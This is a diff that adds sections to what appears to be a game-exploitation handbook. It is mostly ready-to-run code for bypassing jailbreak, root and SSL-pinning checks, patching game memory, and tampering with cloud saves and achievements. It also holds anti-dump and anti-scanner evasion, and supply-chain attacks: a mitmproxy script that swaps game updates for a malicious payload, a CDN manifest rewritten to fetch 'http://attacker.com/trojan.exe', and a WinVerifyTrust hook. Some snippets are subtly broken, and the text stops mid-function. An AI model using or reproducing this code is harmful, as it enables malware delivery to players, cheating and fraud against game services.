@@ -7154,6 +7154,1487 @@ public:
 
 ---
 
+## Advanced Mobile Game Exploitation
+
+### iOS Advanced Techniques
+
+#### Jailbreak Detection Bypass
+
+```objc
+// Hook jailbreak detection methods
+%hook JailbreakDetector
+
+- (BOOL)isJailbroken {
+    return NO;
+}
+
+- (BOOL)checkForCydia {
+    return NO;
+}
+
+- (BOOL)checkSuspiciousFiles {
+    return NO;
+}
+
+%end
+
+// Hook file access to hide jailbreak files
+%hook NSFileManager
+
+- (BOOL)fileExistsAtPath:(NSString *)path {
+    NSArray *blacklist = @[@"/Applications/Cydia.app",
+                           @"/Library/MobileSubstrate",
+                           @"/bin/bash",
+                           @"/usr/sbin/sshd"];
+    
+    if ([blacklist containsObject:path]) {
+        return NO;
+    }
+    
+    return %orig;
+}
+
+%end
+```
+
+#### iOS Memory Manipulation with Frida
+
+```javascript
+// Attach to iOS game
+const baseAddr = Module.findBaseAddress('GameBinary');
+
+// Find and patch currency
+const currencyPattern = '48 8B 05 ?? ?? ?? ?? 48 8B 48 10';
+const matches = Memory.scanSync(baseAddr, Process.pageSize * 1000, currencyPattern);
+
+matches.forEach(match => {
+    console.log('[+] Found currency at:', match.address);
+    
+    // Patch to always return max value
+    Memory.protect(match.address, 16, 'rwx');
+    match.address.writeByteArray([
+        0xB8, 0xFF, 0xFF, 0xFF, 0x7F,  // mov eax, 0x7FFFFFFF
+        0xC3                            // ret
+    ]);
+});
+```
+
+#### iOS SSL Pinning Bypass
+
+```javascript
+// Bypass SSL pinning
+if (ObjC.available) {
+    // Bypass NSURLSession pinning
+    const NSURLSession = ObjC.classes.NSURLSession;
+    Interceptor.attach(NSURLSession['- URLSession:didReceiveChallenge:completionHandler:'].implementation, {
+        onEnter: function(args) {
+            const completionHandler = new ObjC.Block(args[4]);
+            const origImpl = completionHandler.implementation;
+            
+            completionHandler.implementation = function(disposition, credential) {
+                // Accept any certificate
+                return origImpl(1, credential);
+            };
+        }
+    });
+    
+    // Bypass AFNetworking pinning
+    const AFHTTPSessionManager = ObjC.classes.AFHTTPSessionManager;
+    if (AFHTTPSessionManager) {
+        Interceptor.replace(AFHTTPSessionManager['- setSecurityPolicy:'].implementation, new NativeCallback(function(self, sel, policy) {
+            console.log('[+] Bypassed AFNetworking SSL pinning');
+        }, 'void', ['pointer', 'pointer', 'pointer']));
+    }
+}
+```
+
+### Android Advanced Techniques
+
+#### Root Detection Bypass (Native)
+
+```c
+// Hook native root checks with Substrate
+#include <substrate.h>
+
+static int (*original_access)(const char *pathname, int mode);
+
+int hooked_access(const char *pathname, int mode) {
+    // Block access to root indicators
+    const char *root_files[] = {
+        "/system/app/Superuser.apk",
+        "/system/bin/su",
+        "/system/xbin/su",
+        "/data/data/com.noshufou.android.su",
+        "/data/data/com.topjohnwu.magisk"
+    };
+    
+    for (int i = 0; i < sizeof(root_files)/sizeof(root_files[0]); i++) {
+        if (strcmp(pathname, root_files[i]) == 0) {
+            errno = ENOENT;
+            return -1;
+        }
+    }
+    
+    return original_access(pathname, mode);
+}
+
+__attribute__((constructor))
+static void initialize() {
+    MSHookFunction((void *)access, (void *)hooked_access, (void **)&original_access);
+}
+```
+
+#### Android Memory Scanning with /proc/maps
+
+```python
+import os
+import struct
+
+class AndroidMemoryScanner:
+    def __init__(self, package_name):
+        self.pid = self.get_pid(package_name)
+        
+    def get_pid(self, package_name):
+        # Get PID from ps
+        output = os.popen(f'adb shell "ps | grep {package_name}"').read()
+        return int(output.split()[1])
+    
+    def scan_memory(self, value, value_type='i'):
+        matches = []
+        
+        # Read memory maps
+        maps = os.popen(f'adb shell "cat /proc/{self.pid}/maps"').read()
+        
+        for line in maps.split('\n'):
+            if 'rw' not in line or '[' in line:
+                continue
+                
+            parts = line.split()
+            addr_range = parts[0].split('-')
+            start = int(addr_range[0], 16)
+            end = int(addr_range[1], 16)
+            
+            # Pull memory region
+            size = end - start
+            if size > 10000000:  # Skip huge regions
+                continue
+                
+            try:
+                mem_data = self.read_memory(start, size)
+                matches.extend(self.find_value(mem_data, value, start, value_type))
+            except:
+                pass
+        
+        return matches
+    
+    def read_memory(self, address, size):
+        cmd = f'adb shell "su -c \'dd if=/proc/{self.pid}/mem bs=1 count={size} skip={address} 2>/dev/null\'" | xxd -p'
+        hex_data = os.popen(cmd).read().replace('\n', '')
+        return bytes.fromhex(hex_data)
+    
+    def find_value(self, data, value, base_addr, value_type):
+        matches = []
+        packed = struct.pack(value_type, value)
+        
+        offset = 0
+        while True:
+            offset = data.find(packed, offset)
+            if offset == -1:
+                break
+            matches.append(base_addr + offset)
+            offset += 1
+        
+        return matches
+
+# Usage
+scanner = AndroidMemoryScanner('com.example.game')
+addresses = scanner.scan_memory(1000)  # Find value 1000
+print(f'Found at: {[hex(addr) for addr in addresses]}')
+```
+
+#### Android IL2CPP Offset Dumping
+
+```python
+import frida
+import sys
+
+def on_message(message, data):
+    print(message)
+
+device = frida.get_usb_device()
+pid = device.spawn(['com.game.package'])
+session = device.attach(pid)
+
+script = session.create_script("""
+// Dump IL2CPP offsets on Android
+const il2cpp = Process.findModuleByName('libil2cpp.so');
+console.log('[+] libil2cpp.so base:', il2cpp.base);
+
+// Find il2cpp_domain_get
+const domain_get = Module.findExportByName('libil2cpp.so', 'il2cpp_domain_get');
+console.log('[+] il2cpp_domain_get:', domain_get);
+
+// Get domain
+const domain = new NativeFunction(domain_get, 'pointer', [])();
+console.log('[+] Domain:', domain);
+
+// Find il2cpp_domain_get_assemblies
+const get_assemblies = Module.findExportByName('libil2cpp.so', 'il2cpp_domain_get_assemblies');
+const assemblies_func = new NativeFunction(get_assemblies, 'pointer', ['pointer', 'pointer']);
+
+const sizePtr = Memory.alloc(4);
+const assemblies = assemblies_func(domain, sizePtr);
+const count = sizePtr.readInt();
+
+console.log('[+] Found', count, 'assemblies');
+
+// Enumerate assemblies
+for (let i = 0; i < count; i++) {
+    const assembly = assemblies.add(i * Process.pointerSize).readPointer();
+    const image = new NativeFunction(Module.findExportByName('libil2cpp.so', 'il2cpp_assembly_get_image'), 'pointer', ['pointer'])(assembly);
+    const name = new NativeFunction(Module.findExportByName('libil2cpp.so', 'il2cpp_image_get_name'), 'pointer', ['pointer'])(image);
+    
+    console.log('[+] Assembly:', name.readCString());
+    
+    // Enumerate classes
+    const classCount = new NativeFunction(Module.findExportByName('libil2cpp.so', 'il2cpp_image_get_class_count'), 'int', ['pointer'])(image);
+    
+    for (let j = 0; j < classCount; j++) {
+        const klass = new NativeFunction(Module.findExportByName('libil2cpp.so', 'il2cpp_image_get_class'), 'pointer', ['pointer', 'int'])(image, j);
+        const className = new NativeFunction(Module.findExportByName('libil2cpp.so', 'il2cpp_class_get_name'), 'pointer', ['pointer'])(klass);
+        
+        console.log('  Class:', className.readCString());
+        
+        // Dump field offsets
+        const iter = Memory.alloc(Process.pointerSize);
+        iter.writePointer(ptr(0));
+        
+        while (true) {
+            const field = new NativeFunction(Module.findExportByName('libil2cpp.so', 'il2cpp_class_get_fields'), 'pointer', ['pointer', 'pointer'])(klass, iter);
+            if (field.isNull()) break;
+            
+            const fieldName = new NativeFunction(Module.findExportByName('libil2cpp.so', 'il2cpp_field_get_name'), 'pointer', ['pointer'])(field);
+            const offset = new NativeFunction(Module.findExportByName('libil2cpp.so', 'il2cpp_field_get_offset'), 'int', ['pointer'])(field);
+            
+            console.log('    Field:', fieldName.readCString(), 'Offset:', '0x' + offset.toString(16));
+        }
+    }
+}
+""")
+
+script.on('message', on_message)
+script.load()
+device.resume(pid)
+sys.stdin.read()
+```
+
+---
+
+## Cloud Save & Achievement Exploitation
+
+### Cloud Save Tampering
+
+#### Steam Cloud Save Manipulation
+
+```python
+import os
+import vdf  # Valve Data Format parser
+import struct
+
+class SteamCloudExploit:
+    def __init__(self, app_id):
+        self.app_id = app_id
+        self.steam_path = os.path.expanduser('~/.steam/steam')
+        self.userdata_path = os.path.join(self.steam_path, 'userdata')
+        
+    def find_save_files(self):
+        saves = []
+        for user_id in os.listdir(self.userdata_path):
+            save_dir = os.path.join(self.userdata_path, user_id, str(self.app_id), 'remote')
+            if os.path.exists(save_dir):
+                for file in os.listdir(save_dir):
+                    saves.append(os.path.join(save_dir, file))
+        return saves
+    
+    def modify_save(self, save_path, modifications):
+        with open(save_path, 'rb') as f:
+            data = bytearray(f.read())
+        
+        # Example: Modify currency at known offset
+        if 'currency' in modifications:
+            offset = modifications['currency']['offset']
+            value = modifications['currency']['value']
+            struct.pack_into('<I', data, offset, value)
+        
+        # Recalculate checksum if present
+        if self.has_checksum(data):
+            checksum = self.calculate_checksum(data[:-4])
+            struct.pack_into('<I', data, len(data) - 4, checksum)
+        
+        with open(save_path, 'wb') as f:
+            f.write(data)
+    
+    def calculate_checksum(self, data):
+        # CRC32 checksum
+        import zlib
+        return zlib.crc32(data) & 0xFFFFFFFF
+
+# Usage
+exploit = SteamCloudExploit(730)  # CS:GO app ID
+saves = exploit.find_save_files()
+exploit.modify_save(saves[0], {
+    'currency': {'offset': 0x1234, 'value': 999999}
+})
+```
+
+#### Epic Games Cloud Save Exploit
+
+```python
+import requests
+import json
+import base64
+
+class EpicCloudSaveExploit:
+    def __init__(self, access_token):
+        self.access_token = access_token
+        self.base_url = 'https://fls-na.ol.epicgames.com/api/cloudstorage'
+        
+    def list_files(self, account_id, app_name):
+        headers = {'Authorization': f'Bearer {self.access_token}'}
+        url = f'{self.base_url}/system/{app_name}/{account_id}'
+        
+        response = requests.get(url, headers=headers)
+        return response.json()
+    
+    def download_save(self, account_id, app_name, filename):
+        headers = {'Authorization': f'Bearer {self.access_token}'}
+        url = f'{self.base_url}/system/{app_name}/{account_id}/{filename}'
+        
+        response = requests.get(url, headers=headers)
+        return response.content
+    
+    def upload_modified_save(self, account_id, app_name, filename, data):
+        headers = {
+            'Authorization': f'Bearer {self.access_token}',
+            'Content-Type': 'application/octet-stream'
+        }
+        url = f'{self.base_url}/system/{app_name}/{account_id}/{filename}'
+        
+        response = requests.put(url, headers=headers, data=data)
+        return response.status_code == 204
+    
+    def inject_items(self, save_data, item_list):
+        # Modify save game to add items
+        # Implementation depends on game-specific format
+        save_json = json.loads(save_data)
+        
+        if 'inventory' in save_json:
+            for item in item_list:
+                save_json['inventory'].append(item)
+        
+        return json.dumps(save_json)
+
+# Usage
+exploit = EpicCloudSaveExploit('your_access_token')
+files = exploit.list_files('account_id', 'Fortnite')
+save_data = exploit.download_save('account_id', 'Fortnite', 'SaveSlot.sav')
+modified = exploit.inject_items(save_data, [{'id': 'legendary_weapon', 'count': 99}])
+exploit.upload_modified_save('account_id', 'Fortnite', 'SaveSlot.sav', modified)
+```
+
+### Achievement/Trophy System Exploitation
+
+#### Steam Achievement Unlocker
+
+```cpp
+#include <windows.h>
+#include <steam/steam_api.h>
+
+class AchievementUnlocker {
+private:
+    ISteamUserStats* stats;
+    
+public:
+    AchievementUnlocker() {
+        SteamAPI_Init();
+        stats = SteamUserStats();
+    }
+    
+    void UnlockAll() {
+        int numAchievements = stats->GetNumAchievements();
+        
+        for (int i = 0; i < numAchievements; i++) {
+            const char* name = stats->GetAchievementName(i);
+            
+            // Set achievement
+            stats->SetAchievement(name);
+            
+            // Set progress to 100%
+            stats->IndicateAchievementProgress(name, 100, 100);
+        }
+        
+        // Store stats
+        stats->StoreStats();
+    }
+    
+    void UnlockSpecific(const char* achievement_name) {
+        stats->SetAchievement(achievement_name);
+        stats->StoreStats();
+    }
+    
+    void ResetAll() {
+        stats->ResetAllStats(true);  // true = reset achievements too
+        stats->StoreStats();
+    }
+};
+
+// Inject this into game process
+extern "C" __declspec(dllexport) void InjectMain() {
+    AchievementUnlocker unlocker;
+    unlocker.UnlockAll();
+}
+```
+
+#### PlayStation Trophy Injection (PS4/PS5)
+
+```python
+import struct
+import hashlib
+
+class PS4TrophyExploit:
+    def __init__(self, save_path):
+        self.save_path = save_path
+        
+    def parse_trophy_data(self):
+        with open(self.save_path, 'rb') as f:
+            data = f.read()
+        
+        # PS4 trophy data structure
+        magic = data[:4]
+        if magic != b'TROP':
+            raise ValueError('Invalid trophy file')
+        
+        version = struct.unpack('<I', data[4:8])[0]
+        trophy_count = struct.unpack('<I', data[8:12])[0]
+        
+        trophies = []
+        offset = 64  # Header size
+        
+        for i in range(trophy_count):
+            trophy_id = struct.unpack('<I', data[offset:offset+4])[0]
+            unlocked = struct.unpack('B', data[offset+4:offset+5])[0]
+            timestamp = struct.unpack('<Q', data[offset+8:offset+16])[0]
+            
+            trophies.append({
+                'id': trophy_id,
+                'unlocked': unlocked == 1,
+                'timestamp': timestamp
+            })
+            
+            offset += 32
+        
+        return trophies
+    
+    def unlock_trophy(self, trophy_id):
+        with open(self.save_path, 'rb') as f:
+            data = bytearray(f.read())
+        
+        # Find trophy entry
+        trophy_count = struct.unpack('<I', data[8:12])[0]
+        offset = 64
+        
+        for i in range(trophy_count):
+            current_id = struct.unpack('<I', data[offset:offset+4])[0]
+            
+            if current_id == trophy_id:
+                # Set unlocked flag
+                data[offset+4] = 1
+                
+                # Set current timestamp
+                import time
+                timestamp = int(time.time())
+                struct.pack_into('<Q', data, offset+8, timestamp)
+                
+                break
+            
+            offset += 32
+        
+        # Recalculate HMAC-SHA256
+        hmac_offset = len(data) - 32
+        key = self.get_trophy_key()
+        hmac = hashlib.sha256(key + bytes(data[:hmac_offset])).digest()
+        data[hmac_offset:] = hmac
+        
+        with open(self.save_path, 'wb') as f:
+            f.write(data)
+    
+    def get_trophy_key(self):
+        # Trophy encryption key (example)
+        return b'\x00' * 16
+
+# Usage
+exploit = PS4TrophyExploit('/mnt/usb0/PS4/SAVEDATA/trophy.dat')
+exploit.unlock_trophy(0)  # Unlock first trophy
+```
+
+---
+
+## Speedrunning Tools & Techniques
+
+### Tool-Assisted Speedrun (TAS) Framework
+
+```python
+import time
+import keyboard
+import json
+
+class TASFramework:
+    def __init__(self, game_fps=60):
+        self.game_fps = game_fps
+        self.frame_time = 1.0 / game_fps
+        self.inputs = []
+        self.recording = False
+        
+    def record_frame(self):
+        frame_inputs = {
+            'keys': [],
+            'mouse': {'x': 0, 'y': 0, 'buttons': []}
+        }
+        
+        # Capture keyboard state
+        for key_code in range(256):
+            if keyboard.is_pressed(key_code):
+                frame_inputs['keys'].append(key_code)
+        
+        return frame_inputs
+    
+    def start_recording(self):
+        self.recording = True
+        self.inputs = []
+        
+        print('[+] Recording TAS inputs...')
+        
+        while self.recording:
+            frame_start = time.time()
+            
+            frame_data = self.record_frame()
+            self.inputs.append(frame_data)
+            
+            # Wait for next frame
+            elapsed = time.time() - frame_start
+            if elapsed < self.frame_time:
+                time.sleep(self.frame_time - elapsed)
+    
+    def stop_recording(self):
+        self.recording = False
+        print(f'[+] Recorded {len(self.inputs)} frames')
+    
+    def playback(self):
+        print('[+] Playing back TAS...')
+        
+        for i, frame in enumerate(self.inputs):
+            frame_start = time.time()
+            
+            # Release all keys first
+            keyboard.unhook_all()
+            
+            # Press frame keys
+            for key in frame['keys']:
+                keyboard.press(key)
+            
+            # Wait for next frame
+            elapsed = time.time() - frame_start
+            if elapsed < self.frame_time:
+                time.sleep(self.frame_time - elapsed)
+            
+            # Release keys
+            for key in frame['keys']:
+                keyboard.release(key)
+    
+    def save(self, filename):
+        with open(filename, 'w') as f:
+            json.dump(self.inputs, f)
+    
+    def load(self, filename):
+        with open(filename, 'r') as f:
+            self.inputs = json.load(f)
+
+# Usage
+tas = TASFramework(game_fps=60)
+keyboard.add_hotkey('f1', tas.start_recording)
+keyboard.add_hotkey('f2', tas.stop_recording)
+keyboard.add_hotkey('f3', tas.playback)
+keyboard.wait()
+```
+
+### RNG Manipulation
+
+```python
+import struct
+import ctypes
+
+class RNGManipulator:
+    def __init__(self, process_name):
+        self.process = self.open_process(process_name)
+        
+    def find_rng_state(self):
+        # Common RNG algorithms
+        
+        # 1. Linear Congruential Generator (LCG)
+        # Next = (a * seed + c) mod m
+        # Common values: a=1103515245, c=12345, m=2^31
+        
+        # 2. Mersenne Twister
+        # State array of 624 uint32 values
+        
+        # Scan for RNG state patterns
+        return self.scan_memory_patterns()
+    
+    def predict_next_values(self, seed, algorithm='lcg'):
+        if algorithm == 'lcg':
+            # LCG prediction
+            a = 1103515245
+            c = 12345
+            m = 2**31
+            
+            predictions = []
+            current = seed
+            
+            for i in range(100):
+                current = (a * current + c) % m
+                predictions.append(current)
+            
+            return predictions
+        
+        elif algorithm == 'mt19937':
+            # Mersenne Twister prediction
+            return self.predict_mt19937(seed)
+    
+    def manipulate_seed(self, target_value):
+        # Find seed that produces target value
+        for seed in range(1000000):
+            predictions = self.predict_next_values(seed)
+            if target_value in predictions:
+                return seed
+        
+        return None
+    
+    def inject_seed(self, seed_address, new_seed):
+        # Write new seed to memory
+        kernel32 = ctypes.windll.kernel32
+        
+        buffer = ctypes.c_uint32(new_seed)
+        bytes_written = ctypes.c_size_t()
+        
+        kernel32.WriteProcessMemory(
+            self.process,
+            seed_address,
+            ctypes.byref(buffer),
+            4,
+            ctypes.byref(bytes_written)
+        )
+
+# Example: Manipulate loot drop RNG
+rng = RNGManipulator('game.exe')
+seed_addr = rng.find_rng_state()
+target_seed = rng.manipulate_seed(target_value=legendary_item_id)
+rng.inject_seed(seed_addr, target_seed)
+```
+
+### Frame-Perfect Input Execution
+
+```cpp
+#include <Windows.h>
+#include <chrono>
+#include <vector>
+
+class FramePerfectExecutor {
+private:
+    double target_fps;
+    double frame_time_ms;
+    std::chrono::high_resolution_clock::time_point last_frame;
+    
+    struct FrameInput {
+        int frame_number;
+        std::vector<WORD> keys;
+        int mouse_dx;
+        int mouse_dy;
+    };
+    
+    std::vector<FrameInput> input_sequence;
+    
+public:
+    FramePerfectExecutor(double fps) : target_fps(fps) {
+        frame_time_ms = 1000.0 / fps;
+        last_frame = std::chrono::high_resolution_clock::now();
+    }
+    
+    void AddFrameInput(int frame, std::vector<WORD> keys, int dx = 0, int dy = 0) {
+        FrameInput input;
+        input.frame_number = frame;
+        input.keys = keys;
+        input.mouse_dx = dx;
+        input.mouse_dy = dy;
+        
+        input_sequence.push_back(input);
+    }
+    
+    void Execute() {
+        int current_frame = 0;
+        
+        for (const auto& frame_input : input_sequence) {
+            // Wait until target frame
+            while (current_frame < frame_input.frame_number) {
+                WaitForNextFrame();
+                current_frame++;
+            }
+            
+            // Execute inputs for this frame
+            for (WORD key : frame_input.keys) {
+                SendInput(key, true);
+            }
+            
+            if (frame_input.mouse_dx != 0 || frame_input.mouse_dy != 0) {
+                mouse_event(MOUSEEVENTF_MOVE, frame_input.mouse_dx, frame_input.mouse_dy, 0, 0);
+            }
+            
+            // Release keys at frame end
+            for (WORD key : frame_input.keys) {
+                SendInput(key, false);
+            }
+        }
+    }
+    
+    void WaitForNextFrame() {
+        auto now = std::chrono::high_resolution_clock::now();
+        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(now - last_frame).count();
+        
+        if (elapsed < frame_time_ms) {
+            Sleep(frame_time_ms - elapsed);
+        }
+        
+        last_frame = std::chrono::high_resolution_clock::now();
+    }
+    
+    void SendInput(WORD key, bool press) {
+        INPUT input = {0};
+        input.type = INPUT_KEYBOARD;
+        input.ki.wVk = key;
+        input.ki.dwFlags = press ? 0 : KEYEVENTF_KEYUP;
+        
+        ::SendInput(1, &input, sizeof(INPUT));
+    }
+};
+
+// Usage: Frame-perfect combo execution
+FramePerfectExecutor executor(60.0);  // 60 FPS game
+
+// Frame 0: Jump
+executor.AddFrameInput(0, {VK_SPACE});
+
+// Frame 3: Attack while in air
+executor.AddFrameInput(3, {'J'});
+
+// Frame 5: Special move
+executor.AddFrameInput(5, {'K', 'L'});
+
+executor.Execute();
+```
+
+---
+
+## Memory Forensics Evasion
+
+### Anti-Memory Dump Techniques
+
+```cpp
+#include <Windows.h>
+#include <winternl.h>
+
+class AntiDumpTechniques {
+public:
+    // Erase PE header from memory
+    static void ErasePEHeader() {
+        HMODULE hModule = GetModuleHandle(NULL);
+        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
+        PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
+        
+        DWORD oldProtect;
+        VirtualProtect(hModule, pNTHeaders->OptionalHeader.SizeOfHeaders, PAGE_READWRITE, &oldProtect);
+        
+        // Zero out PE header
+        memset(hModule, 0, pNTHeaders->OptionalHeader.SizeOfHeaders);
+        
+        VirtualProtect(hModule, pNTHeaders->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &oldProtect);
+    }
+    
+    // Hide memory regions from tools
+    static void HideMemoryRegions() {
+        MEMORY_BASIC_INFORMATION mbi;
+        PBYTE address = NULL;
+        
+        while (VirtualQuery(address, &mbi, sizeof(mbi))) {
+            if (mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE) {
+                // Change page protection to hide from scanners
+                DWORD oldProtect;
+                VirtualProtect(mbi.BaseAddress, mbi.RegionSize, PAGE_NOACCESS, &oldProtect);
+                
+                // Perform operations
+                // ...
+                
+                // Restore protection
+                VirtualProtect(mbi.BaseAddress, mbi.RegionSize, oldProtect, &oldProtect);
+            }
+            
+            address += mbi.RegionSize;
+        }
+    }
+    
+    // Detect memory scanning tools
+    static bool DetectMemoryScanner() {
+        // Check for known scanner process names
+        const wchar_t* scanners[] = {
+            L"cheatengine-x86_64.exe",
+            L"ollydbg.exe",
+            L"x64dbg.exe",
+            L"processhacker.exe"
+        };
+        
+        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (hSnapshot == INVALID_HANDLE_VALUE) return false;
+        
+        PROCESSENTRY32W pe32;
+        pe32.dwSize = sizeof(PROCESSENTRY32W);
+        
+        if (Process32FirstW(hSnapshot, &pe32)) {
+            do {
+                for (const auto& scanner : scanners) {
+                    if (_wcsicmp(pe32.szExeFile, scanner) == 0) {
+                        CloseHandle(hSnapshot);
+                        return true;
+                    }
+                }
+            } while (Process32NextW(hSnapshot, &pe32));
+        }
+        
+        CloseHandle(hSnapshot);
+        return false;
+    }
+    
+    // Encrypt sensitive data in memory
+    static void EncryptMemoryRegion(void* data, size_t size, DWORD key) {
+        DWORD* ptr = (DWORD*)data;
+        size_t dwords = size / sizeof(DWORD);
+        
+        for (size_t i = 0; i < dwords; i++) {
+            ptr[i] ^= key;
+        }
+    }
+    
+    // Guard pages to detect scanning
+    static void SetupGuardPages(void* address, size_t size) {
+        DWORD oldProtect;
+        VirtualProtect(address, size, PAGE_EXECUTE_READ | PAGE_GUARD, &oldProtect);
+    }
+};
+
+// Anti-dump guard
+class MemoryGuard {
+private:
+    static LONG CALLBACK VectoredHandler(EXCEPTION_POINTERS* pExceptionInfo) {
+        if (pExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_GUARD_PAGE_VIOLATION) {
+            // Memory accessed by scanner detected
+            ExitProcess(0);
+        }
+        
+        return EXCEPTION_CONTINUE_SEARCH;
+    }
+    
+public:
+    static void Initialize() {
+        AddVectoredExceptionHandler(1, VectoredHandler);
+        
+        // Erase headers
+        AntiDumpTechniques::ErasePEHeader();
+        
+        // Check for scanners
+        if (AntiDumpTechniques::DetectMemoryScanner()) {
+            ExitProcess(0);
+        }
+    }
+};
+```
+
+---
+
+## Supply Chain & Update Mechanism Attacks
+
+### Game Update MITM Attack
+
+```python
+import mitmproxy
+from mitmproxy import http
+import hashlib
+import os
+
+class GameUpdateInjector:
+    def __init__(self, target_domain, payload_path):
+        self.target_domain = target_domain
+        self.payload_path = payload_path
+        
+    def request(self, flow: http.HTTPFlow) -> None:
+        # Intercept update requests
+        if self.target_domain in flow.request.pretty_host:
+            if '/updates/' in flow.request.path or '.patch' in flow.request.path:
+                print(f'[+] Intercepted update request: {flow.request.path}')
+    
+    def response(self, flow: http.HTTPFlow) -> None:
+        if self.target_domain in flow.request.pretty_host:
+            if '/updates/' in flow.request.path:
+                # Replace legitimate update with malicious payload
+                with open(self.payload_path, 'rb') as f:
+                    malicious_update = f.read()
+                
+                flow.response.content = malicious_update
+                
+                # Recalculate content-length
+                flow.response.headers['content-length'] = str(len(malicious_update))
+                
+                print(f'[+] Injected malicious update ({len(malicious_update)} bytes)')
+
+# Run with: mitmdump -s game_update_injector.py
+addons = [GameUpdateInjector('gameserver.example.com', 'malicious.patch')]
+```
+
+### CDN Manifest Manipulation
+
+```python
+import requests
+import json
+import hashlib
+
+class CDNManifestExploit:
+    def __init__(self, cdn_url):
+        self.cdn_url = cdn_url
+        
+    def download_manifest(self):
+        response = requests.get(f'{self.cdn_url}/manifest.json')
+        return response.json()
+    
+    def modify_manifest(self, manifest, file_path, malicious_url):
+        # Find file entry in manifest
+        for file_entry in manifest['files']:
+            if file_entry['path'] == file_path:
+                # Replace with malicious URL
+                file_entry['url'] = malicious_url
+                
+                # Recalculate hash if client validates
+                # (requires hosting malicious file)
+                malicious_content = requests.get(malicious_url).content
+                file_entry['sha256'] = hashlib.sha256(malicious_content).hexdigest()
+                file_entry['size'] = len(malicious_content)
+                
+                print(f'[+] Modified manifest entry for {file_path}')
+                break
+        
+        return manifest
+    
+    def serve_modified_manifest(self, manifest):
+        # Host modified manifest on attacker server
+        from flask import Flask, jsonify
+        
+        app = Flask(__name__)
+        
+        @app.route('/manifest.json')
+        def get_manifest():
+            return jsonify(manifest)
+        
+        app.run(host='0.0.0.0', port=80)
+
+# Usage
+exploit = CDNManifestExploit('https://cdn.game.com')
+manifest = exploit.download_manifest()
+modified = exploit.modify_manifest(manifest, 'GameBinary.exe', 'http://attacker.com/trojan.exe')
+exploit.serve_modified_manifest(modified)
+```
+
+### Signature Verification Bypass
+
+```cpp
+#include <Windows.h>
+#include <wincrypt.h>
+#include <softpub.h>
+
+// Hook WinVerifyTrust to bypass signature checks
+typedef LONG (WINAPI* WinVerifyTrust_t)(HWND, GUID*, LPVOID);
+WinVerifyTrust_t Original_WinVerifyTrust = nullptr;
+
+LONG WINAPI Hooked_WinVerifyTrust(HWND hwnd, GUID* pgActionID, LPVOID pWVTData) {
+    // Always return success
+    return ERROR_SUCCESS;
+}
+
+void BypassSignatureVerification() {
+    HMODULE hWintrust = LoadLibrary(L"wintrust.dll");
+    if (hWintrust) {
+        Original_WinVerifyTrust = (WinVerifyTrust_t)GetProcAddress(hWintrust, "WinVerifyTrust");
+        
+        // Hook the function
+        DWORD oldProtect;
+        VirtualProtect(Original_WinVerifyTrust, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
+        
+        // JMP to our hook
+        BYTE jmp[5] = {0xE9};
+        *(DWORD*)(jmp + 1) = (DWORD)((BYTE*)Hooked_WinVerifyTrust - (BYTE*)Original_WinVerifyTrust - 5);
+        
+        memcpy(Original_WinVerifyTrust, jmp, 5);
+        
+        VirtualProtect(Original_WinVerifyTrust, 5, oldProtect, &oldProtect);
+    }
+}
+```
+
+---
+
+## Side-Channel Attacks for Game State Inference
+
+### Cache-Based Side Channel
+
+```c
+#include <stdio.h>
+#include <stdint.h>
+#include <x86intrin.h>
+
+#define CACHE_LINE_SIZE 64
+#define THRESHOLD 80
+
+class CacheSideChannel {
+public:
+    // Flush+Reload attack
+    static uint64_t ProbeAddress(void* addr) {
+        uint64_t start, end;
+        
+        // Flush from cache
+        _mm_clflush(addr);
+        _mm_mfence();
+        
+        // Wait for victim to access
+        for (volatile int i = 0; i < 1000; i++);
+        
+        // Measure reload time
+        start = __rdtscp(&ui);
+        *(volatile char*)addr;
+        end = __rdtscp(&ui);
+        
+        _mm_mfence();
+        
+        return end - start;
+    }
+    
+    // Detect if address was accessed by game
+    static bool WasAccessed(void* addr) {
+        uint64_t time = ProbeAddress(addr);
+        return time < THRESHOLD;  // Fast = in cache = was accessed
+    }
+    
+    // Monitor game state through cache
+    static void MonitorGameState(void* game_state_addr, size_t size) {
+        printf("[+] Monitoring game state via cache side-channel\n");
+        
+        while (true) {
+            for (size_t offset = 0; offset < size; offset += CACHE_LINE_SIZE) {
+                void* addr = (char*)game_state_addr + offset;
+                
+                if (WasAccessed(addr)) {
+                    printf("[+] Cache line accessed: offset 0x%zx\n", offset);
+                    
+                    // Infer game state from access pattern
+                    AnalyzeAccessPattern(offset);
+                }
+            }
+            
+            Sleep(10);
+        }
+    }
+    
+    static void AnalyzeAccessPattern(size_t offset) {
+        // Example: Detect player position updates
+        if (offset >= 0x100 && offset < 0x110) {
+            printf("  -> Player position being updated\n");
+        }
+        // Example: Detect health changes
+        else if (offset == 0x200) {
+            printf("  -> Health value accessed\n");
+        }
+    }
+    
+private:
+    static unsigned int ui;
+};
+
+unsigned int CacheSideChannel::ui = 0;
+```
+
+### Timing-Based Health Detection
+
+```python
+import time
+import statistics
+
+class TimingAttack:
+    def __init__(self, game_process):
+        self.process = game_process
+        
+    def measure_execution_time(self, function_addr, iterations=1000):
+        times = []
+        
+        for _ in range(iterations):
+            start = time.perf_counter_ns()
+            
+            # Call target function (via DLL injection or similar)
+            self.call_function(function_addr)
+            
+            end = time.perf_counter_ns()
+            times.append(end - start)
+        
+        return statistics.mean(times), statistics.stdev(times)
+    
+    def detect_health_threshold(self, damage_function_addr):
+        # Health checks often have branches: if (health <= 0)
+        # Timing will differ based on branch taken
+        
+        print('[+] Measuring damage function timing...')
+        
+        # Set health to different values and measure
+        health_values = [100, 50, 25, 10, 1, 0]
+        timings = {}
+        
+        for health in health_values:
+            self.set_health(health)
+            mean_time, std_dev = self.measure_execution_time(damage_function_addr)
+            timings[health] = mean_time
+            
+            print(f'Health {health}: {mean_time:.2f}ns (±{std_dev:.2f})')
+        
+        # Detect timing anomaly (death threshold)
+        for health, timing in timings.items():
+            if abs(timing - timings[100]) > 50:  # Significant difference
+                print(f'[+] Death threshold detected at health <= {health}')
+                break
+    
